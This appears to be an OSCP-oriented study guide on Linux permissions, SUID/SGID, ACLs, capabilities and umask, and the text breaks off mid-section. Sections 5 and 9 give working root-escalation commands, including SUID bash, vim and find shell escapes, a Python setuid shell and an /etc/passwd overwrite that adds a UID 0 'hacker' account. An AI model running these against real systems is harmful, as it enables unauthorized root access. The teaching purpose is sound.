# Permissions & Capabilities: The Gatekeepers - COMPREHENSIVE GUIDE

---
title: "Permissions & Capabilities"
parent: "[[03_Linux]]"
tags:
  - linux
  - permissions
  - acl
  - capabilities
  - suid
  - privesc
created: 2026-01-23
updated: 2026-01-24
---

> **Executive Summary**: Linux permissions are the fundamental security mechanism controlling who can access what on a Linux system. Unlike Windows where permissions can be complex and GUI-based, Linux uses a elegant but powerful permission model based on three entities (User, Group, Other) and three permission types (Read, Write, Execute). However, this simple model is extended with Special Permissions (SUID, SGID, Sticky Bit), Access Control Lists (ACLs), and Linux Capabilities that can turn simple permission bits into privilege escalation goldmines. For OSCP and penetration testing, understanding permissions is CRITICAL - misconfigured SUID binaries are one of the most common privilege escalation vectors in the real world. This comprehensive guide takes you from absolute beginner to exploitation expert, covering every aspect of Linux permissions with 20+ working examples, hands-on labs, and real OSCP-style scenarios.

---

## Table of Contents

1. [What Are Permissions? (Absolute Beginner)](#1-what-are-permissions-absolute-beginner)
2. [The Standard UGO Model](#2-the-standard-ugo-model)
3. [Understanding rwx - Read, Write, Execute](#3-understanding-rwx---read-write-execute)
4. [Octal Notation - The Number System](#4-octal-notation---the-number-system)
5. [Special Permissions: SUID, SGID, Sticky Bit](#5-special-permissions-suid-sgid-sticky-bit)
6. [Access Control Lists (ACLs)](#6-access-control-lists-acls)
7. [Linux Capabilities: Root Power Sliced](#7-linux-capabilities-root-power-sliced)
8. [Umask - Default Permission Control](#8-umask---default-permission-control)
9. [SUID Binary Exploitation for Privilege Escalation](#9-suid-binary-exploitation-for-privilege-escalation)
10. [GTFOBins - The SUID Exploit Database](#10-gtfobins---the-suid-exploit-database)
11. [Capability-Based Privilege Escalation](#11-capability-based-privilege-escalation)
12. [Permission Enumeration Techniques](#12-permission-enumeration-techniques)
13. [Writable Files and Directories](#13-writable-files-and-directories)
14. [The Docker/LXD Group Privilege Escalation](#14-the-dockerlxd-group-privilege-escalation)
15. [World-Writable Files and Security Risks](#15-world-writable-files-and-security-risks)
16. [Permission Persistence Techniques](#16-permission-persistence-techniques)
17. [Blue Team: Auditing and Defense](#17-blue-team-auditing-and-defense)
18. [Common Permission Misconfigurations](#18-common-permission-misconfigurations)
19. [Hands-On Labs](#19-hands-on-labs)
20. [Interview Questions and Answers](#20-interview-questions-and-answers)
21. [Summary and Next Steps](#21-summary-and-next-steps)

---

## 1. What Are Permissions? (Absolute Beginner)

### 1.1 The Concept - Real World Analogy

Think of a Linux system as an apartment building:
- **Files** are like individual rooms or lockers
- **Permissions** are like keys and access cards
- **The Owner** is the person who rented the locker
- **The Group** is like a family or roommates who share access
- **Others** are random strangers in the building

**The question**: Who can open which doors?

In Windows, you might right-click a file, go to Properties → Security, and see a complex list of users and permissions. In Linux, permissions are built into the filesystem at the binary level - every single file and directory has permission bits stored directly in its metadata.

### 1.2 Why Permissions Matter for Security

**Scenario**: You compromise a web server and get a shell as the `www-data` user (low privilege). Your goal is to become `root` (full system control). The path from low privilege to root often involves exploiting **permission misconfigurations**:

- A SUID binary that runs as root but you can control
- A world-writable configuration file
- A capability on a binary that shouldn't have it
- Membership in a privileged group like `docker`

Understanding permissions is THE foundation of Linux privilege escalation.

### 1.3 The Three Questions

Every file access in Linux answers three questions:
1. **WHO** is trying to access? (User identity/UID)
2. **WHAT** are they trying to do? (Read/Write/Execute)
3. **ARE THEY ALLOWED?** (Permission check)

```
┌─────────────────────────────────────────────────────┐
│         LINUX PERMISSION CHECK FLOW                 │
├─────────────────────────────────────────────────────┤
│                                                     │
│  User tries to access file                         │
│           │                                         │
│           ▼                                         │
│  ┌─────────────────┐                               │
│  │ Who are you?    │  Check UID/GID                │
│  │ (id command)    │                               │
│  └────────┬────────┘                               │
│           │                                         │
│           ▼                                         │
│  ┌─────────────────┐                               │
│  │ Are you OWNER?  │──YES──► Check User bits (rwx) │
│  └────────┬────────┘                               │
│           │ NO                                      │
│           ▼                                         │
│  ┌─────────────────┐                               │
│  │ In file GROUP?  │──YES──► Check Group bits (rwx)│
│  └────────┬────────┘                               │
│           │ NO                                      │
│           ▼                                         │
│  ┌─────────────────┐                               │
│  │ Check Other bits│────────► Other bits (rwx)     │
│  └─────────────────┘                               │
│           │                                         │
│           ▼                                         │
│      ALLOW or DENY                                 │
│                                                     │
└─────────────────────────────────────────────────────┘
```

---

## 2. The Standard UGO Model

### 2.1 User, Group, Other Explained

Every file in Linux has TWO identities:
1. **Owner (User)**: The UID of the person who created it
2. **Group**: A GID that the file belongs to

Then there are three permission categories:
- **User (u)**: The owner of the file
- **Group (g)**: Anyone in the file's group
- **Other (o)**: Everyone else on the system

### 2.2 Viewing Permissions

```bash
ls -l /bin/bash
```

Output:
```
-rwxr-xr-x 1 root root 1234567 Jan 1 12:00 /bin/bash
```

Let's decode this:

```
-rwxr-xr-x  1  root  root  1234567  Jan 1 12:00  /bin/bash
│││││││││││  │   │     │      │        │          │
│││││││││││  │   │     │      │        │          └─ Filename
│││││││││││  │   │     │      │        └─ Modification time
│││││││││││  │   │     │      └─ File size (bytes)
│││││││││││  │   │     └─ Group owner
│││││││││││  │   └─ User owner (UID)
│││││││││││  └─ Number of hard links
││││││││││└─ Other: Execute
│││││││││└─ Other: Write (-)
││││││││└─ Other: Read
│││││││└─ Group: Execute
││││││└─ Group: Write (-)
│││││└─ Group: Read
││││└─ User/Owner: Execute
│││└─ User/Owner: Write
││└─ User/Owner: Read
│└─ File type (- = regular file, d = directory, l = symlink)
```

### 2.3 File Type Indicators

The first character tells you what TYPE of file it is:

| Symbol | Type | Description |
|:-------|:-----|:------------|
| `-` | Regular file | Text, binary, script, etc. |
| `d` | Directory | Folder/container for files |
| `l` | Symbolic link | Shortcut to another file |
| `c` | Character device | Keyboard, mouse (/dev/tty) |
| `b` | Block device | Hard drive, USB (/dev/sda) |
| `p` | Named pipe | Inter-process communication |
| `s` | Socket | Network communication endpoint |

### 2.4 Checking Your Identity

```bash
# Who am I?
whoami

# Full identity information
id

# Example output:
# uid=1000(john) gid=1000(john) groups=1000(john),4(adm),27(sudo),999(docker)
```

This shows:
- **UID**: Your numeric user ID (1000)
- **Primary GID**: Your primary group (1000)
- **Secondary Groups**: Additional groups you belong to (adm, sudo, docker)

**CRITICAL FOR OSCP**: The `groups` list shows privileged group membership. If you see `docker`, `lxd`, `disk`, or `sudo`, you might have an easy privilege escalation path!

---

## 3. Understanding rwx - Read, Write, Execute

### 3.1 The Three Permission Types

Each entity (User, Group, Other) can have three permissions:

#### Read (r) - Value 4

**On Files**:
- View contents with `cat`, `less`, `head`, etc.
- Copy the file

**On Directories**:
- List contents with `ls`
- **NOTE**: You CANNOT `cd` into it without execute!

#### Write (w) - Value 2

**On Files**:
- Modify contents
- Truncate/append to file
- **NOTE**: Cannot delete the file (that's a directory permission)

**On Directories**:
- Create new files inside
- Delete files inside
- Rename files inside
- **This is the dangerous one for privilege escalation!**

#### Execute (x) - Value 1

**On Files**:
- Run as a program/script
- Without this, you get "Permission denied" even if file is executable code

**On Directories**:
- `cd` into the directory (traverse)
- Access files inside (even if you can't list them)
- **Weird fact**: You can access `/dir/file.txt` if you know the name, even if you can't `ls /dir`!

### 3.2 The Dash (-) Means Denied

```
rwx = All permissions
rw- = Read + Write, no Execute
r-- = Read only
--- = No permissions at all
```

### 3.3 Examples - Directory vs File Permissions

**Example 1: Read-only file**
```bash
-r--r--r-- 1 root root 100 Jan 1 12:00 /etc/hosts
```
- Owner (root): Can read
- Group (root): Can read
- Others: Can read
- **Nobody can modify or execute it**

**Example 2: Executable script**
```bash
-rwxr-xr-x 1 john john 250 Jan 1 12:00 /home/john/script.sh
```
- Owner (john): Can read, write, execute
- Group (john): Can read, execute (cannot modify)
- Others: Can read, execute (cannot modify)

**Example 3: Private directory**
```bash
drwx------ 2 john john 4096 Jan 1 12:00 /home/john/private/
```
- Owner (john): Full access
- Group: NO access
- Others: NO access
- **Only john can even `ls` or `cd` into this directory**

**Example 4: Shared directory**
```bash
drwxrwxr-x 2 john developers 4096 Jan 1 12:00 /opt/project/
```
- Owner (john): Full access
- Group (developers): Full access (can create/delete files)
- Others: Can read and enter, but not create files

### 3.4 The Directory Permission Gotcha

**CRITICAL CONCEPT**: To delete a file, you need **write permission on the DIRECTORY**, not the file itself!

```bash
# Create a read-only file
echo "protected" > file.txt
chmod 444 file.txt  # Read-only for everyone
ls -l file.txt
# -r--r--r-- 1 john john 10 Jan 24 file.txt

# Can you delete it?
rm file.txt
# rm: remove write-protected regular file 'file.txt'? y
# (It gets deleted!)

# Why? Because the DIRECTORY has write permission!
```

This is why `/tmp` works - the directory is world-writable, so anyone can create/delete files, but the **sticky bit** (covered later) prevents deleting OTHER people's files.

---

## 4. Octal Notation - The Number System

### 4.1 Why Use Numbers?

Instead of typing `chmod u+rwx,g+rx,o+rx file`, you can type `chmod 755 file`.

It's faster, more precise, and easier to read once you understand it.

### 4.2 The Math

Each permission has a numeric value:
- **Read (r)** = 4
- **Write (w)** = 2
- **Execute (x)** = 1

You ADD them together for each category:

```
rwx = 4 + 2 + 1 = 7
rw- = 4 + 2 + 0 = 6
r-x = 4 + 0 + 1 = 5
r-- = 4 + 0 + 0 = 4
-wx = 0 + 2 + 1 = 3
-w- = 0 + 2 + 0 = 2
--x = 0 + 0 + 1 = 1
--- = 0 + 0 + 0 = 0
```

### 4.3 Three Digits = Three Categories

```
chmod 755 file.txt
      |||
      ||└─ Other: 5 = r-x (read + execute)
      |└─ Group: 5 = r-x (read + execute)
      └─ User: 7 = rwx (read + write + execute)
```

### 4.4 Common Permission Patterns

| Octal | Symbolic | Use Case |
|:------|:---------|:---------|
| `777` | `rwxrwxrwx` | **DANGEROUS**: Everyone can do everything |
| `755` | `rwxr-xr-x` | **Standard executable**: Owner full, others read/execute |
| `700` | `rwx------` | **Private executable**: Only owner can access |
| `666` | `rw-rw-rw-` | **World-writable file** (bad idea usually) |
| `644` | `rw-r--r--` | **Standard file**: Owner can edit, others read |
| `600` | `rw-------` | **Private file**: Only owner can read/write |
| `555` | `r-xr-xr-x` | **Read-only executable** |
| `444` | `r--r--r--` | **Read-only file** |

### 4.5 Practical Examples

**Example 1: Create a private script**
```bash
#!/bin/bash
# Create a script
cat > my_script.sh << 'EOF'
#!/bin/bash
echo "Secret script running..."
whoami
EOF

# Make it executable ONLY for you
chmod 700 my_script.sh

# Verify
ls -l my_script.sh
# -rwx------ 1 john john 56 Jan 24 my_script.sh

# Run it
./my_script.sh
# Secret script running...
# john
```

**Example 2: Shared project directory**
```bash
# Create directory for team project
mkdir /opt/teamproject
chmod 770 /opt/teamproject
chown john:developers /opt/teamproject

# Verify
ls -ld /opt/teamproject
# drwxrwx--- 2 john developers 4096 Jan 24 /opt/teamproject
```

**Example 3: Public read-only documentation**
```bash
# Create documentation
mkdir /usr/share/company-docs
chmod 755 /usr/share/company-docs

# Files inside are read-only
echo "Manual" > /usr/share/company-docs/manual.txt
chmod 644 /usr/share/company-docs/manual.txt

# Result: Everyone can read, only owner can modify
```

### 4.6 Symbolic Mode (Alternative)

If you prefer letters to numbers:

```bash
chmod u+x file     # Add execute for User
chmod g-w file     # Remove write for Group
chmod o+r file     # Add read for Other
chmod a+x file     # Add execute for All (u+g+o)
chmod go-rwx file  # Remove all permissions from Group and Other
```

**Example workflow**:
```bash
# Create a file
touch script.sh

# Start with no permissions
chmod 000 script.sh
ls -l script.sh
# ---------- 1 john john 0 Jan 24 script.sh

# Add owner read/write
chmod u+rw script.sh
# -rw------- 1 john john 0 Jan 24 script.sh

# Add execute for everyone
chmod a+x script.sh
# -rwx--x--x 1 john john 0 Jan 24 script.sh
```

---

## 5. Special Permissions: SUID, SGID, Sticky Bit

### 5.1 Why Special Permissions Exist

The standard `rwx` model has limitations:

**Problem 1**: Users need to change their password, but passwords are stored in `/etc/shadow` which is owned by root. How can a regular user modify a root-owned file?

**Problem 2**: A shared directory where multiple users collaborate. How do you ensure all files created inside have the same group ownership?

**Problem 3**: `/tmp` is world-writable so anyone can create files. But how do you prevent users from deleting each other's files?

**Solution**: Special permission bits that modify how the normal permissions work.

### 5.2 SUID (Set User ID) - The Danger Zone

#### What It Does

When a file with SUID is executed, the process runs with the **Owner's UID**, not the user who ran it.

```
┌───────────────────────────────────────────┐
│       NORMAL EXECUTION                    │
├───────────────────────────────────────────┤
│  User: john (UID 1000)                    │
│  Runs: /bin/cat /etc/shadow               │
│  Process UID: 1000 (john)                 │
│  Result: Permission denied                │
└───────────────────────────────────────────┘

┌───────────────────────────────────────────┐
│       SUID EXECUTION                      │
├───────────────────────────────────────────┤
│  User: john (UID 1000)                    │
│  Runs: /usr/bin/passwd                    │
│  File owner: root (UID 0)                 │
│  SUID bit SET                             │
│  Process UID: 0 (ROOT!)                   │
│  Result: Can modify /etc/shadow           │
└───────────────────────────────────────────┘
```

#### How to Identify SUID

Look for `s` instead of `x` in the owner's execute position:

```bash
ls -l /usr/bin/passwd
# -rwsr-xr-x 1 root root 68208 Jan 1 /usr/bin/passwd
#    ^
#    └─ SUID bit (s instead of x)
```

Numeric value: **4000** (add to regular permissions)

```bash
chmod 4755 file   # rwsr-xr-x
chmod u+s file    # Same thing (symbolic)
```

#### Legitimate SUID Examples

```bash
# Find all SUID binaries
find /usr/bin -perm -4000 -type f 2>/dev/null | head -10
```

Common legitimate ones:
- `/usr/bin/passwd` - Change password (needs root to modify /etc/shadow)
- `/usr/bin/sudo` - Run commands as root
- `/usr/bin/su` - Switch user
- `/bin/ping` - Send ICMP packets (needs raw socket access)

#### DANGEROUS SUID Examples

These should NEVER be SUID:
- `vim`, `nano`, `less`, `more` - Can read/write any file
- `find`, `cp`, `mv` - Can access/modify any file
- `bash`, `sh`, `python` - Direct shell/interpreter access
- `nmap`, `tcpdump` - Network tools with excessive privilege

#### Example: Creating a SUID Binary (LAB)

```bash
# As root, create a dangerous SUID binary
sudo su
cp /bin/bash /tmp/rootbash
chmod 4755 /tmp/rootbash
ls -l /tmp/rootbash
# -rwsr-xr-x 1 root root 1234567 Jan 24 /tmp/rootbash

# Exit back to regular user
exit

# Now as regular user
/tmp/rootbash -p
# (The -p flag preserves the SUID privilege)

whoami
# root

# YOU ARE NOW ROOT!
```

**This is the #1 privilege escalation technique in OSCP.**

### 5.3 SGID (Set Group ID)

#### SGID on Files

Similar to SUID, but the process inherits the **Group ID** of the file owner.

```bash
ls -l /usr/bin/wall
# -rwxr-sr-x 1 root tty 35144 Jan 1 /usr/bin/wall
#       ^
#       └─ SGID bit (s in group position)
```

Less commonly exploited than SUID, but still useful.

#### SGID on Directories (More Important)

When SGID is set on a **directory**, all new files created inside inherit the **directory's group**, not the creator's primary group.

**Use case**: Shared project folders

```bash
# Create shared directory
mkdir /opt/project
chown alice:developers /opt/project
chmod 2775 /opt/project  # SGID + rwxrwxr-x

ls -ld /opt/project
# drwxrwsr-x 2 alice developers 4096 Jan 24 /opt/project
#       ^
#       └─ SGID bit

# Now when Bob (who is in 'developers' group) creates a file:
# (Bob's primary group is 'bob', not 'developers')
su - bob
cd /opt/project
touch bobfile.txt

ls -l bobfile.txt
# -rw-r--r-- 1 bob developers 0 Jan 24 bobfile.txt
#                    ^
#                    └─ Group is 'developers', not 'bob'!
```

Numeric value: **2000**

```bash
chmod 2755 directory   # rwxr-sr-x
chmod g+s directory    # Same thing (symbolic)
```

### 5.4 Sticky Bit

#### What It Does

On a directory with the sticky bit, only the **file owner** (or root) can delete/rename files inside, even if the directory is world-writable.

```
┌─────────────────────────────────────────────┐
│          WITHOUT STICKY BIT                 │
├─────────────────────────────────────────────┤
│  Directory: drwxrwxrwx /shared              │
│  Alice creates: /shared/alice.txt           │
│  Bob can: DELETE /shared/alice.txt          │
│  (Because directory is world-writable)      │
└─────────────────────────────────────────────┘

┌─────────────────────────────────────────────┐
│          WITH STICKY BIT                    │
├─────────────────────────────────────────────┤
│  Directory: drwxrwxrwt /tmp                 │
│  Alice creates: /tmp/alice.txt              │
│  Bob tries: rm /tmp/alice.txt               │
│  Result: Permission denied                  │
│  (Only Alice or root can delete it)         │
└─────────────────────────────────────────────┘
```

Look for `t` in the other's execute position:

```bash
ls -ld /tmp
# drwxrwxrwt 20 root root 4096 Jan 24 /tmp
#         ^
#         └─ Sticky bit
```

Numeric value: **1000**

```bash
chmod 1777 directory   # rwxrwxrwt
chmod +t directory     # Same thing (symbolic)
```

**Example: The /tmp Directory**

```bash
# As alice
touch /tmp/alice_file.txt
ls -l /tmp/alice_file.txt
# -rw-r--r-- 1 alice alice 0 Jan 24 /tmp/alice_file.txt

# As bob
rm /tmp/alice_file.txt
# rm: cannot remove '/tmp/alice_file.txt': Operation not permitted

# This is the sticky bit protecting Alice's file!
```

### 5.5 Special Permissions Summary Table

| Bit | Name | Numeric | Symbolic | File Effect | Directory Effect |
|:----|:-----|:--------|:---------|:------------|:-----------------|
| SUID | Set User ID | 4000 | `u+s` | Runs as file owner | (No effect) |
| SGID | Set Group ID | 2000 | `g+s` | Runs as file group | New files inherit directory group |
| Sticky | Sticky Bit | 1000 | `+t` | (No effect) | Only owner can delete files |

### 5.6 The Capital S and T

If you see a capital `S` or `T`, it means the special bit is set but execute is NOT:

```bash
chmod 4644 file
ls -l file
# -rwSr--r-- 1 root root 100 Jan 24 file
#    ^
#    └─ Capital S = SUID set, but no execute (useless)

# This is basically a misconfiguration
```

For the special bit to work on files, you need execute permission:
```bash
chmod 4755 file   # Correct: -rwsr-xr-x (lowercase s)
chmod 4644 file   # Wrong: -rwSr--r-- (capital S, won't work)
```

---

## 6. Access Control Lists (ACLs)

### 6.1 The Limitation of UGO

Standard UGO permissions are rigid:
- Only ONE owner
- Only ONE group
- All "others" treated the same

**Scenario**: You want Alice and Bob to have full access, Charlie to have read-only, and Dave to have no access at all. The file can only have ONE owner and ONE group. How do you do it?

**Answer**: Access Control Lists (ACLs)

### 6.2 What Are ACLs?

ACLs extend the permission model to allow **fine-grained control** per user or per group.

```
┌─────────────────────────────────────────┐
│         STANDARD PERMISSIONS            │
├─────────────────────────────────────────┤
│  Owner: alice (rwx)                     │
│  Group: developers (r-x)                │
│  Other: (r--)                           │
└─────────────────────────────────────────┘

┌─────────────────────────────────────────┐
│         WITH ACLs                       │
├─────────────────────────────────────────┤
│  Owner: alice (rwx)                     │
│  Group: developers (r-x)                │
│  User: bob (rwx)         ← EXTRA        │
│  User: charlie (r--)     ← EXTRA        │
│  User: dave (---)        ← EXTRA        │
│  Other: (r--)                           │
└─────────────────────────────────────────┘
```

### 6.3 The "Invisible" Plus Sign

When ACLs are present, `ls -l` shows a `+` after the permissions:

```bash
ls -l file.txt
# -rw-r--r--+ 1 alice alice 100 Jan 24 file.txt
#           ^
#           └─ Plus sign indicates ACLs are present
```

**DANGER**: Standard tools might lie! If you only look at `ls -l`, you might miss that Bob has write access via ACL!

### 6.4 Viewing ACLs

```bash
getfacl file.txt
```

Example output:
```
# file: file.txt
# owner: alice
# group: alice
user::rw-           # Owner (alice) has rw-
user:bob:rwx        # User bob has rwx (via ACL)
user:charlie:r--    # User charlie has r-- (via ACL)
group::r--          # Group (alice) has r--
mask::rwx           # Effective permissions mask
other::r--          # Others have r--
```

### 6.5 Setting ACLs

```bash
# Give bob full access
setfacl -m u:bob:rwx file.txt

# Give charlie read-only
setfacl -m u:charlie:r file.txt

# Give dave no access (explicitly)
setfacl -m u:dave:--- file.txt

# Give the 'managers' group read access
setfacl -m g:managers:r file.txt

# Verify
getfacl file.txt
```

### 6.6 Removing ACLs

```bash
# Remove specific user ACL
setfacl -x u:bob file.txt

# Remove ALL ACLs
setfacl -b file.txt

# Verify (+ should be gone)
ls -l file.txt
# -rw-r--r-- 1 alice alice 100 Jan 24 file.txt
```

### 6.7 Default ACLs (for Directories)

You can set **default ACLs** on directories that apply to all NEW files created inside:

```bash
# Create directory
mkdir /opt/shared

# Set default ACL: all new files give bob rwx
setfacl -d -m u:bob:rwx /opt/shared

# Verify
getfacl /opt/shared
# default:user::rwx
# default:user:bob:rwx
# default:group::r-x
# default:other::r-x

# Now create a file
touch /opt/shared/newfile.txt

# Check its ACLs
getfacl /opt/shared/newfile.txt
# user::rw-
# user:bob:rwx        ← Inherited from default!
# group::r-x
# other::r-x
```

### 6.8 ACLs and Security Implications

**For Attackers**:
- Always check ACLs with `getfacl`, not just `ls -l`
- A file might appear read-only but ACLs grant you write access
- Check for overly permissive default ACLs on directories

**For Defenders**:
- ACLs add complexity - more complexity = more mistakes
- Regularly audit ACLs: `getfacl -R /path`
- Document ACL usage

**Example: Hidden Write Access**

```bash
# Standard view
ls -l /etc/config.conf
# -rw-r--r--+ 1 root root 500 Jan 24 /etc/config.conf
# Looks read-only for non-root users

# ACL view
getfacl /etc/config.conf
# user::rw-
# user:www-data:rwx    ← WEB SERVER HAS WRITE ACCESS!
# group::r--
# other::r--

# This is a privilege escalation vector!
```

---

## 7. Linux Capabilities: Root Power Sliced

### 7.1 The Problem with SUID

SUID is "all or nothing":
- Either the process runs as root (UID 0) with FULL power
- Or it runs as the user with limited power

**Problem**: What if a program only needs ONE root privilege?

Example: A web server needs to bind to port 80 (requires root), but doesn't need to read `/etc/shadow` or format hard drives.

Running the entire web server as root violates the **Principle of Least Privilege**.

### 7.2 What Are Capabilities?

Linux Capabilities split root's power into ~40 distinct privileges.

```
┌──────────────────────────────────────────────┐
│           OLD MODEL: ROOT                    │
├──────────────────────────────────────────────┤
│  UID 0 = ROOT = ALL POWERFUL                 │
│  - Bind low ports                            │
│  - Read any file                             │
│  - Kill any process                          │
│  - Mount filesystems                         │
│  - Load kernel modules                       │
│  - Change system time                        │
│  - Everything else                           │
└──────────────────────────────────────────────┘

┌──────────────────────────────────────────────┐
│           NEW MODEL: CAPABILITIES            │
├──────────────────────────────────────────────┤
│  CAP_NET_BIND_SERVICE = Bind ports < 1024    │
│  CAP_NET_RAW = Open raw sockets              │
│  CAP_SYS_ADMIN = Mount, debug, BPF           │
│  CAP_SETUID = Change process UID             │
│  CAP_DAC_OVERRIDE = Bypass file permissions  │
│  ... (40+ more)                              │
└──────────────────────────────────────────────┘
```

### 7.3 Key Capabilities

| Capability | What It Allows | Security Impact |
|:-----------|:---------------|:----------------|
| `CAP_NET_BIND_SERVICE` | Bind to ports < 1024 | Low (needed for web servers) |
| `CAP_NET_RAW` | Create raw sockets (ping, nmap) | Medium (packet sniffing) |
| `CAP_NET_ADMIN` | Network configuration (interfaces, routes) | Medium |
| `CAP_SYS_ADMIN` | Mount filesystems, debug processes, BPF | **CRITICAL - basically root** |
| `CAP_SETUID` | Change process UID to any user | **CRITICAL - instant privesc** |
| `CAP_SETGID` | Change process GID to any group | **CRITICAL** |
| `CAP_DAC_OVERRIDE` | Bypass file read/write/execute checks | **CRITICAL - ignore permissions** |
| `CAP_DAC_READ_SEARCH` | Bypass file read + directory execute | **HIGH - read any file** |
| `CAP_FOWNER` | Bypass permission checks as file owner | **HIGH** |
| `CAP_SYS_PTRACE` | Trace any process (inject code) | **HIGH** |
| `CAP_SYS_MODULE` | Load/unload kernel modules | **CRITICAL - rootkit** |
| `CAP_CHOWN` | Change file ownership | Medium |

**The "God" Capabilities**: `CAP_SYS_ADMIN`, `CAP_SETUID`, `CAP_DAC_OVERRIDE` are essentially root.

### 7.4 Checking Capabilities

#### On Files

```bash
# Check capabilities of a specific file
getcap /usr/bin/ping

# Output:
# /usr/bin/ping = cap_net_raw+ep

# Recursively check all files (OSCP enumeration)
getcap -r / 2>/dev/null

# Common output:
# /usr/bin/ping = cap_net_raw+ep
# /usr/bin/mtr-packet = cap_net_raw+ep
```

The `+ep` means:
- `e` = Effective (capability is active)
- `p` = Permitted (process has permission to use it)

#### On Running Processes

```bash
# Check capabilities of current shell
cat /proc/self/status | grep Cap

# Check specific process
cat /proc/1234/status | grep Cap

# Decode the hex value
capsh --decode=0000003fffffffff
```

### 7.5 Setting Capabilities

```bash
# Give ping capability (instead of SUID)
sudo setcap cap_net_raw+ep /usr/bin/ping

# Remove capability
sudo setcap -r /usr/bin/ping

# Give multiple capabilities
sudo setcap cap_net_raw,cap_net_admin+ep /usr/bin/custom_tool
```

### 7.6 Capabilities vs SUID

**Old way (SUID)**:
```bash
# ping needs root to send ICMP
sudo chmod u+s /usr/bin/ping
ls -l /usr/bin/ping
# -rwsr-xr-x 1 root root ...

# PROBLEM: Runs with FULL root privileges
# If there's a vulnerability, attacker gets ROOT
```

**New way (Capabilities)**:
```bash
# ping only needs raw socket access
sudo setcap cap_net_raw+ep /usr/bin/ping
ls -l /usr/bin/ping
# -rwxr-xr-x 1 root root ...  (no SUID!)

getcap /usr/bin/ping
# cap_net_raw+ep

# BETTER: Only has ONE specific privilege
# Vulnerability = limited impact
```

---

## 8. Umask - Default Permission Control

### 8.1 What Is Umask?

When you create a new file or directory, what permissions does it get by default?

**Answer**: It depends on your `umask` value.

umask is a **permission mask** that REMOVES permissions from the default.

```
┌────────────────────────────────────────┐
│         UMASK CONCEPT                  │
├────────────────────────────────────────┤
│  Default for files:      666 (rw-rw-rw)│
│  Default for directories: 777 (rwxrwxrwx)│
│  umask value:            002           │
│  SUBTRACT (bitwise):                   │
│                                        │
│  File: 666 - 002 = 664 (rw-rw-r--)     │
│  Dir:  777 - 002 = 775 (rwxrwxr-x)     │
└────────────────────────────────────────┘
```

### 8.2 Checking Umask

```bash
umask
# 0002

# Human-readable form
umask -S
# u=rwx,g=rwx,o=rx
```

### 8.3 Common Umask Values

| umask | File Result | Dir Result | Use Case |
|:------|:------------|:-----------|:---------|
| `0022` | `644` (rw-r--r--) | `755` (rwxr-xr-x) | **Default** (secure) |
| `0002` | `664` (rw-rw-r--) | `775` (rwxrwxr-x) | Group collaboration |
| `0077` | `600` (rw-------) | `700` (rwx------) | Paranoid (private) |
| `0000` | `666` (rw-rw-rw-) | `777` (rwxrwxrwx) | **INSECURE** (world-writable) |

### 8.4 Setting Umask

```bash
# Temporary (current session only)
umask 0077

# Test it
touch testfile
ls -l testfile
# -rw------- 1 john john 0 Jan 24 testfile

mkdir testdir
ls -ld testdir
# drwx------ 2 john john 4096 Jan 24 testdir

# Permanent (add to ~/.bashrc)
echo "umask 0077" >> ~/.bashrc
```

### 8.5 Umask in Security

**Red Team**:
- Check default umask: `umask`
- If it's `0000` or `0002`, new files might be world-readable/writable
- Attackers might create files with permissive defaults

**Blue Team**:
- Set secure umask in `/etc/profile`, `/etc/bash.bashrc`
- Recommended: `0022` (default) or `0027` (more restrictive)
- Audit user umasks

**Example: Insecure Umask Exploitation**

```bash
# User has bad umask
umask 0000

# User creates a script with sensitive data
cat > deploy.sh << 'EOF'
#!/bin/bash
DB_PASSWORD="SuperSecret123"
mysql -u root -p$DB_PASSWORD
EOF

# What are the permissions?
ls -l deploy.sh
# -rw-rw-rw- 1 alice alice 75 Jan 24 deploy.sh
# WORLD-READABLE!

# Attacker can read it
cat deploy.sh
# DB_PASSWORD="SuperSecret123"
# GAME OVER
```

---

## 9. SUID Binary Exploitation for Privilege Escalation

### 9.1 The Privilege Escalation Workflow

```
┌────────────────────────────────────────────────┐
│     SUID PRIVESC METHODOLOGY                   │
├────────────────────────────────────────────────┤
│  1. Enumerate SUID binaries                    │
│     find / -perm -4000 -type f 2>/dev/null     │
│                                                │
│  2. Identify non-standard binaries             │
│     Compare to known-good baseline             │
│                                                │
│  3. Check GTFOBins database                    │
│     https://gtfobins.github.io                 │
│                                                │
│  4. Test exploitation                          │
│     Follow GTFOBins instructions               │
│                                                │
│  5. Get root shell                             │
│     whoami → root                              │
└────────────────────────────────────────────────┘
```

### 9.2 Finding SUID Binaries

```bash
# Find all SUID files
find / -perm -4000 -type f 2>/dev/null

# More detailed output
find / -perm -4000 -type f -exec ls -la {} \; 2>/dev/null

# Find SUID files owned by root
find / -uid 0 -perm -4000 -type f 2>/dev/null

# Find SGID files
find / -perm -2000 -type f 2>/dev/null

# Find both SUID and SGID
find / -perm -6000 -type f 2>/dev/null
```

### 9.3 Example: SUID Vim Exploitation

**Scenario**: Administrator set vim as SUID root for "convenience"

```bash
# Check
ls -l /usr/bin/vim
# -rwsr-xr-x 1 root root 3069256 Jan 1 /usr/bin/vim
#    ^
#    └─ SUID bit

# Exploit
vim /etc/shadow

# Inside vim, run command:
:!/bin/bash

# You now have a root shell!
whoami
# root
```

**Alternative**: Edit /etc/shadow directly in vim to add a new root user.

### 9.4 Example: SUID find Exploitation

```bash
# Check
ls -l /usr/bin/find
# -rwsr-xr-x 1 root root 320160 Jan 1 /usr/bin/find

# Exploit using -exec
find . -exec /bin/sh -p \; -quit

# You are now root
whoami
# root
```

### 9.5 Example: SUID bash Exploitation

```bash
# Attacker copied bash to /tmp
cp /bin/bash /tmp/rootbash
sudo chmod u+s /tmp/rootbash

# As low-privilege user
/tmp/rootbash -p

# The -p flag is CRITICAL (preserves SUID privilege)
whoami
# root
```

Without `-p`:
```bash
/tmp/rootbash

# Bash drops privileges for security
whoami
# john (still low privilege)
```

### 9.6 Example: SUID Python/Perl

```bash
# SUID python
ls -l /usr/bin/python3
# -rwsr-xr-x 1 root root ...

# Exploit
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

whoami
# root
```

### 9.7 Example: SUID cp (Copy)

```bash
# SUID cp binary
ls -l /usr/bin/cp
# -rwsr-xr-x 1 root root ...

# Exploit: Overwrite /etc/passwd
# First, create malicious passwd file
echo 'hacker:$1$evil$8Jx0sNcPxaRBSLQHj54gk/:0:0:root:/root:/bin/bash' > /tmp/passwd

# The hash above is: "password123"

# Overwrite the real /etc/passwd
cp /tmp/passwd /etc/passwd

# Now login
su hacker
Password: password123

whoami
# root
```

### 9.8 Example: Shared Object Injection

Some SUID binaries load shared libraries. If you can control which library it loads, you can execute arbitrary code as root.

**Check for vulnerable binaries**:
```bash
# Find SUID binaries
